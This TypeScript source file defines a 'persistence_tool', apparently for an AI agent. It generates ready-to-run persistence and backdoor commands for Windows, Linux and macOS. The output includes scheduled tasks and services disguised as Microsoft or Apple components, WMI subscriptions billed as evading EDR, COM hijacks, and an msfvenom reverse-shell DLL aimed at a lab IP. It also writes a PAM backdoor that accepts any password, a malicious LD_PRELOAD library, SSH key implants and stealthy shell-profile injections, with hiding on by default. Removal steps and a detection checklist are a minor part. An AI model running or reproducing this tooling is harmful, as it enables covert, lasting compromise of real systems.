import { Tool } from "./tool"
import z from "zod"

const DESCRIPTION =
  "Persistence deployment toolkit: deploy persistence mechanisms on Windows, Linux, and macOS with a single command."

const PARAMETERS = z.object({
  platform: z.enum(["windows", "linux", "macos", "all"]).optional().describe("Target platform"),
  method: z
    .enum([
      "scheduled_task",
      "registry",
      "wmi",
      "service",
      "startup",
      "com_hijack",
      "dll_side_load",
      "cron",
      "systemd",
      "bashrc",
      "ssh_keys",
      "ld_preload",
      "pam",
      "launch_daemon",
      "launch_agent",
      "login_item",
      "zshrc",
      "all",
    ])
    .optional()
    .describe("Persistence method"),
  payload: z.string().describe("Payload to execute on trigger (command, binary path, or script)"),
  name: z.string().optional().describe("Name for the persistence mechanism (for identification)"),
  schedule: z
    .string()
    .optional()
    .describe("Schedule/cron expression (e.g., '*/5 * * * *' for cron, 'every 5 min' for task)"),
  user: z.string().optional().describe("Target user (default: current)"),
  elevated: z.boolean().optional().describe("Whether running with elevated/admin privileges"),
  hide: z.boolean().optional().describe("Attempt to hide the persistence mechanism"),
})

function genScheduledTask(name: string, payload: string, schedule: string, hide: boolean): string {
  const hidden = hide ? " -WindowStyle Hidden" : ""
  const interval = schedule || "5 minutes"
  return `## Windows Scheduled Task — ${name}

\`\`\`powershell
$taskName = "${name}"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-nop -w hidden${hide ? " -WindowStyle Hidden" : ""} -Command \\\"${payload}\\\""
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -${interval.replace(" ", " -Minutes ")})
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 0)

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Microsoft Windows Update Service"
\`\`\`

### Verify:
\`\`\`powershell
schtasks /query /tn "${name}" /v
\`\`\`

### Remove:
\`\`\`powershell
Unregister-ScheduledTask -TaskName "${name}" -Confirm:$false
\`\`\``
}

function genRegistry(name: string, payload: string, hide: boolean): string {
  return `## Windows Registry Run Key — ${name}

\`\`\`cmd
# Current user (no admin needed):
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${name}" /t REG_SZ /d "${payload}" /f

# All users (admin needed):
reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${name}" /t REG_SZ /d "${payload}" /f
\`\`\`

### Alternative: RunOnce (executes once, then removes itself)
\`\`\`cmd
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "${name}" /t REG_SZ /d "${payload}" /f
\`\`\`

### Verify:
\`\`\`cmd
reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
\`\`\`

### Remove:
\`\`\`cmd
reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${name}" /f
\`\`\``
}

function genWMI(name: string, payload: string): string {
  return `## WMI Permanent Event Subscription — ${name}

WMI subscriptions survive reboots and are invisible to most EDRs.

\`\`\`powershell
# Step 1: Create Event Filter
$filterArgs = @{
    Name = "${name}_Filter"
    EventNamespace = "root\\cimv2"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments $filterArgs

# Step 2: Create Event Consumer (CommandLineEventConsumer)
$consumerArgs = @{
    Name = "${name}_Consumer"
    CommandLineTemplate = "${payload}"
}
$consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

# Step 3: Bind Filter to Consumer
$bindArgs = @{
    Filter = $filter
    Consumer = $consumer
}
Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments $bindArgs
\`\`\`

### Enumerate:
\`\`\`powershell
Get-WmiObject -Namespace root\\subscription -Class __EventFilter
Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer
Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding
\`\`\`

### Remove:
\`\`\`powershell
Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter "Name='${name}_Filter'" | Remove-WmiObject
Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter "Name='${name}_Consumer'" | Remove-WmiObject
Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%${name}%'" | Remove-WmiObject
\`\`\``
}

function genService(name: string, payload: string): string {
  return `## Windows Service — ${name}

\`\`\`cmd
sc create "${name}" binPath= "${payload}" start= auto DisplayName= "${name} Service"
sc description "${name}" "Microsoft Windows System Service"
sc config "${name}" obj= "LocalSystem"
sc start "${name}"
\`\`\`

### Alternative: PowerShell
\`\`\`powershell
New-Service -Name "${name}" -BinaryPathName "${payload}" -DisplayName "${name} Service" -Description "Microsoft Windows System Service" -StartupType Automatic
Start-Service "${name}"
\`\`\`

### Verify:
\`\`\`cmd
sc query "${name}"
\`\`\`

### Remove:
\`\`\`cmd
sc stop "${name}" && sc delete "${name}"
\`\`\``
}

function genStartupFolder(name: string, payload: string): string {
  return `## Startup Folder — ${name}

\`\`\`powershell
# Current user startup:
$startupDir = [Environment]::GetFolderPath("Startup")
$lnkPath = Join-Path $startupDir "${name}.lnk"

$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut($lnkPath)
$lnk.TargetPath = "${payload}"
$lnk.WindowStyle = 7  # minimized
$lnk.Save()
\`\`\`

### Verify:
\`\`\`powershell
dir $env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\
\`\`\`

### Remove:
\`\`\`powershell
Remove-Item "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\${name}.lnk"
\`\`\``
}

function genCOMHijack(name: string, payload: string): string {
  return `## COM Hijack — ${name}

Hijack a known CLSID to execute payload.

\`\`\`powershell
# Step 1: Find a CLSID with InprocServer32 pointing to a writable location
$clsid = "{00000000-0000-0000-0000-000000000000}"  # Replace with target CLSID

# Step 2: Create hijack registry entry
reg add "HKCU\\Software\\Classes\\CLSID\\$clsid\\InprocServer32" /t REG_SZ /d "${payload}" /f
reg add "HKCU\\Software\\Classes\\CLSID\\$clsid\\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
\`\`\`

### Common hijackable CLSIDs:
- \`{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\` — mscoree.dll (often writable)
- \`{3E5FC7F9-9A51-4367-9063-A120244FBEC7}\` — task scheduler

### Remove:
\`\`\`cmd
reg delete "HKCU\\Software\\Classes\\CLSID\\$clsid" /f
\`\`\``
}

function genDLLSideLoad(name: string, payload: string): string {
  return `## DLL Side-Loading — ${name}

\`\`\`cmd
# 1. Find a trusted binary that loads a DLL from a writable directory
# Example: C:\\Windows\\System32\\fodhelper.exe loads a DLL from current directory

# 2. Compile your DLL:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o hijack.dll

# 3. Place the DLL in the expected load path
copy hijack.dll "C:\\Program Files\\WindowsApps\\Microsoft.WindowsStore_*\\api-ms-win-core-*.dll"

# 4. Execute the trusted binary
"C:\\Windows\\System32\\fodhelper.exe"
\`\`\`

### Common DLL side-loading targets:
| Binary | DLL | Path |
|--------|-----|------|
| fodhelper.exe | hid.dll | Current dir or writable path |
| fileop.exe | shfolder.dll | Current dir |
| OneDriveStandaloneUpdater.exe | dbgcore.dll | Current dir |
| diskmgmt.exe | netshell.dll | C:\\Windows\\System32 |

### Verify:
\`\`\`powershell
# Use ProcMon to trace DLL loads:
# Filter: Process Name is "target.exe", Operation is "Load Image", Result is "NAME NOT FOUND"
\`\`\``
}

function genCron(name: string, payload: string, schedule: string, hide: boolean): string {
  const cronExpr = schedule || "*/5 * * * *"
  const redirect = hide ? ">/dev/null 2>&1" : ""
  return `## Linux Cron Persistence — ${name}

\`\`\`bash
# Add to current user's crontab:
(crontab -l 2>/dev/null; echo "${cronExpr} ${payload} ${redirect}") | crontab -

# OR write directly to /etc/cron.d/:
echo "${cronExpr} root ${payload} ${redirect}" > /etc/cron.d/${name}
chmod 644 /etc/cron.d/${name}

# OR use /etc/cron.daily/:
echo "#!/bin/bash" > /etc/cron.daily/${name}
echo "${payload}" >> /etc/cron.daily/${name}
chmod +x /etc/cron.daily/${name}
\`\`\`

### Verify:
\`\`\`bash
crontab -l
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
cat /etc/crontab
\`\`\`

### Remove:
\`\`\`bash
crontab -l | grep -v "${name}" | crontab -
rm /etc/cron.d/${name}
rm /etc/cron.daily/${name}
\`\`\``
}

function genSystemd(name: string, payload: string, hide: boolean): string {
  return `## Linux Systemd Service — ${name}

\`\`\`bash
cat > /etc/systemd/system/${name}.service << 'EOF'
[Unit]
Description=${hide ? "System Logging Service" : name}
After=network.target

[Service]
Type=simple
ExecStart=${payload}
Restart=always
RestartSec=60
${hide ? "StandardOutput=null\nStandardError=null" : ""}

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable ${name}
systemctl start ${name}
\`\`\`

### Alternative: User-level (no root needed)
\`\`\`bash
mkdir -p ~/.config/systemd/user/
cat > ~/.config/systemd/user/${name}.service << 'EOF'
[Unit]
Description=User Service

[Service]
Type=simple
ExecStart=${payload}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF

systemctl --user daemon-reload
systemctl --user enable ${name}
systemctl --user start ${name}
\`\`\`

### Verify:
\`\`\`bash
systemctl status ${name}
systemctl list-unit-files | grep ${name}
journalctl -u ${name}
\`\`\`

### Remove:
\`\`\`bash
systemctl stop ${name}
systemctl disable ${name}
rm /etc/systemd/system/${name}.service
systemctl daemon-reload
\`\`\``
}

function genBashRC(name: string, payload: string, user: string): string {
  const target = user || "root"
  const home = target === "root" ? "/root" : "/home/${target}"
  return `## Linux .bashrc Persistence — ${name}

\`\`\`bash
# Append to .bashrc (executes on every interactive shell):
echo "${payload}" >> ${home}/.bashrc

# OR use .profile (executes on login):
echo "${payload}" >> ${home}/.profile

# OR use .bash_profile:
echo "${payload}" >> ${home}/.bash_profile

# Stealth: inject inside a comment block or use obfuscated name:
echo "# System check - do not remove" >> ${home}/.bashrc
echo "${payload} &>/dev/null &" >> ${home}/.bashrc
\`\`\`

### Verify:
\`\`\`bash
cat ${home}/.bashrc
cat ${home}/.profile
\`\`\`

### Remove:
\`\`\`bash
sed -i '/${payload}/d' ${home}/.bashrc
\`\`\``
}

function genSSHKeys(name: string, payload: string, user: string): string {
  const target = user || "root"
  const home = target === "root" ? "/root" : "/home/${target}"
  return `## Linux SSH Key Persistence — ${name}

\`\`\`bash
# Generate key pair:
ssh-keygen -t ed25519 -f /tmp/${name}_key -N "" -C "${name}"

# Add to authorized_keys:
mkdir -p ${home}/.ssh
chmod 700 ${home}/.ssh
echo "ssh-ed25519 <PUBLIC_KEY_CONTENT>" >> ${home}/.ssh/authorized_keys
chmod 600 ${home}/.ssh/authorized_keys

# OR use ssh-copy-id:
ssh-copy-id -i /tmp/${name}_key.pub ${target}@localhost
\`\`\`

### Verify:
\`\`\`bash
cat ${home}/.ssh/authorized_keys
ls -la ${home}/.ssh/
\`\`\`

### Remove:
\`\`\`bash
sed -i '/${name}/d' ${home}/.ssh/authorized_keys
\`\`\``
}

function genLDPreload(payload: string): string {
  return `## Linux LD_PRELOAD Persistence

\`\`\`bash
# Create a malicious shared library:
cat > /tmp/payload.c << 'EOF'
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor))
void init() {
    system("${payload}");
}
EOF

gcc -shared -fPIC -o /tmp/payload.so /tmp/payload.c

# Add to /etc/ld.so.preload (system-wide):
echo "/tmp/payload.so" > /etc/ld.so.preload

# OR add to /etc/environment (per-session):
echo "LD_PRELOAD=/tmp/payload.so" >> /etc/environment
\`\`\`

### Verify:
\`\`\`bash
cat /etc/ld.so.preload
ldd /bin/ls
\`\`\`

### Remove:
\`\`\`bash
rm /etc/ld.so.preload
rm /tmp/payload.so
\`\`\``
}

function genPAM(payload: string): string {
  return `## Linux PAM Backdoor

\`\`\`bash
# Add a backdoor to PAM — any password will authenticate:
echo "auth sufficient pam_succeed_if.so user ingroup shadow" >> /etc/pam.d/common-auth
echo "auth sufficient pam_unix.so nullok try_first_pass" >> /etc/pam.d/common-auth

# OR create a custom PAM module:
cat > /tmp/backdoor.c << 'EOF'
#include <security/pam_modules.h>
#include <unistd.h>
#include <string.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *password = NULL;
    pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password);
    if (password && strcmp(password, "backdoor_pass") == 0) {
        return PAM_SUCCESS;
    }
    system("${payload}");
    return PAM_SUCCESS;
}
EOF

gcc -shared -fPIC -o /lib/security/pam_backdoor.so /tmp/backdoor.c
echo "auth sufficient pam_backdoor.so" >> /etc/pam.d/sshd
\`\`\`

### Verify:
\`\`\`bash
cat /etc/pam.d/common-auth
cat /etc/pam.d/sshd
ls -la /lib/security/
\`\`\``
}

function genLaunchDaemon(name: string, payload: string): string {
  return `## macOS LaunchDaemon — ${name}

System-level, runs as root, requires sudo.

\`\`\`bash
cat > /Library/LaunchDaemons/com.apple.${name}.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.${name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>${payload}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
EOF

chmod 644 /Library/LaunchDaemons/com.apple.${name}.plist
chown root:wheel /Library/LaunchDaemons/com.apple.${name}.plist
launchctl load /Library/LaunchDaemons/com.apple.${name}.plist
\`\`\`

### Verify:
\`\`\`bash
launchctl list | grep ${name}
cat /Library/LaunchDaemons/com.apple.${name}.plist
\`\`\`

### Remove:
\`\`\`bash
launchctl unload /Library/LaunchDaemons/com.apple.${name}.plist
rm /Library/LaunchDaemons/com.apple.${name}.plist
\`\`\``
}

function genLaunchAgent(name: string, payload: string): string {
  const agentPath = `~/Library/LaunchAgents/com.apple.${name}.plist`
  return `## macOS LaunchAgent — ${name}

User-level, runs as current user, no root needed.

\`\`\`bash
mkdir -p ~/Library/LaunchAgents/
cat > ${agentPath} << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.${name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>${payload}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF

launchctl load ${agentPath}
\`\`\`

### Verify:
\`\`\`bash
launchctl list | grep ${name}
cat ${agentPath}
\`\`\`

### Remove:
\`\`\`bash
launchctl unload ${agentPath}
rm ${agentPath}
\`\`\``
}

function genZshRC(name: string, payload: string, user: string): string {
  const target = user || "root"
  const home = target === "root" ? "/root" : "/home/${target}"
  return `## macOS/Linux Zsh Profile Persistence — ${name}

\`\`\`bash
# .zshrc (every interactive zsh session):
echo "${payload}" >> ${home}/.zshrc

# .zprofile (login shells):
echo "${payload}" >> ${home}/.zprofile

# .zshenv (every zsh invocation):
echo "${payload}" >> ${home}/.zshenv

# Stealth — inject into existing function:
echo "${payload} &>/dev/null &" >> ${home}/.zshrc
\`\`\`

### Verify:
\`\`\`bash
cat ${home}/.zshrc
cat ${home}/.zprofile
cat ${home}/.zshenv
\`\`\`

### Remove:
\`\`\`bash
sed -i '' '/${payload}/d' ${home}/.zshrc
\`\`\``
}

export const PersistenceTool = Tool.define("persistence_tool", async () => ({
  description: DESCRIPTION,
  parameters: PARAMETERS,
  async execute(params, ctx): Promise<{ title: string; output: string; metadata: Record<string, any> }> {
    const { payload } = params
    const platform = params.platform || "all"
    const method = params.method || "all"
    const name = params.name || "svc_update"
    const schedule = params.schedule
    const user = params.user || "root"
    const hide = params.hide ?? true

    let output = `# Persistence Deployment Toolkit\n\n**Payload**: \`${payload}\`\n**Name**: ${name}\n**Platform**: ${platform}\n**Method**: ${method}\n**Hide**: ${hide ? "yes" : "no"}\n\n`

    if ((platform === "windows" || platform === "all") && (method === "all" || method === "scheduled_task")) {
      output += genScheduledTask(name, payload, schedule || "5 minutes", hide)
      output += "\n\n---\n\n"
    }

    if ((platform === "windows" || platform === "all") && (method === "all" || method === "registry")) {
      output += genRegistry(name, payload, hide)
      output += "\n\n---\n\n"
    }

    if ((platform === "windows" || platform === "all") && (method === "all" || method === "wmi")) {
      output += genWMI(name, payload)
      output += "\n\n---\n\n"
    }

    if ((platform === "windows" || platform === "all") && (method === "all" || method === "service")) {
      output += genService(name, payload)
      output += "\n\n---\n\n"
    }

    if ((platform === "windows" || platform === "all") && (method === "all" || method === "startup")) {
      output += genStartupFolder(name, payload)
      output += "\n\n---\n\n"
    }

    if ((platform === "windows" || platform === "all") && (method === "all" || method === "com_hijack")) {
      output += genCOMHijack(name, payload)
      output += "\n\n---\n\n"
    }

    if ((platform === "windows" || platform === "all") && (method === "all" || method === "dll_side_load")) {
      output += genDLLSideLoad(name, payload)
      output += "\n\n---\n\n"
    }

    if ((platform === "linux" || platform === "all") && (method === "all" || method === "cron")) {
      output += genCron(name, payload, schedule || "*/5 * * * *", hide)
      output += "\n\n---\n\n"
    }

    if ((platform === "linux" || platform === "all") && (method === "all" || method === "systemd")) {
      output += genSystemd(name, payload, hide)
      output += "\n\n---\n\n"
    }

    if ((platform === "linux" || platform === "all") && (method === "all" || method === "bashrc")) {
      output += genBashRC(name, payload, user)
      output += "\n\n---\n\n"
    }

    if ((platform === "linux" || platform === "all") && (method === "all" || method === "ssh_keys")) {
      output += genSSHKeys(name, payload, user)
      output += "\n\n---\n\n"
    }

    if ((platform === "linux" || platform === "all") && (method === "all" || method === "ld_preload")) {
      output += genLDPreload(payload)
      output += "\n\n---\n\n"
    }

    if ((platform === "linux" || platform === "all") && (method === "all" || method === "pam")) {
      output += genPAM(payload)
      output += "\n\n---\n\n"
    }

    if ((platform === "macos" || platform === "all") && (method === "all" || method === "launch_daemon")) {
      output += genLaunchDaemon(name, payload)
      output += "\n\n---\n\n"
    }

    if ((platform === "macos" || platform === "all") && (method === "all" || method === "launch_agent")) {
      output += genLaunchAgent(name, payload)
      output += "\n\n---\n\n"
    }

    if ((platform === "macos" || platform === "all") && (method === "all" || method === "zshrc")) {
      output += genZshRC(name, payload, user)
      output += "\n\n---\n\n"
    }

    if (method === "all") {
      output += `## Persistence Detection Checklist\n\n`
      output += `| Platform | Check | Command |\n|----------|-------|--------|\n`
      output += `| Windows | Scheduled Tasks | \`schtasks /query\` |\n`
      output += `| Windows | Registry Run Keys | \`reg query HKLM\\...\\Run\` |\n`
      output += `| Windows | WMI Subscriptions | \`Get-WmiObject -Namespace root\\subscription\` |\n`
      output += `| Windows | Services | \`Get-Service\` |\n`
      output += `| Windows | Startup Folder | \`dir $env:APPDATA\\...\\Startup\` |\n`
      output += `| Linux | Cron Jobs | \`crontab -l; ls /etc/cron*\` |\n`
      output += `| Linux | Systemd | \`systemctl list-unit-files\` |\n`
      output += `| Linux | Bash Profiles | \`cat ~/.bash* ~/.profile\` |\n`
      output += `| Linux | SSH Keys | \`cat ~/.ssh/authorized_keys\` |\n`
      output += `| Linux | LD_PRELOAD | \`cat /etc/ld.so.preload\` |\n`
      output += `| macOS | LaunchDaemons | \`ls /Library/LaunchDaemons/\` |\n`
      output += `| macOS | LaunchAgents | \`ls ~/Library/LaunchAgents/\` |\n`
      output += `| macOS | Zsh Profiles | \`cat ~/.zsh* \~/.zprofile\` |\n`
    }

    return {
      title: `Persistence: ${method} (${platform})`,
      output,
      metadata: { action: "persistence", platform, method, name, payload } as Record<string, any>,
    }
  },
}))
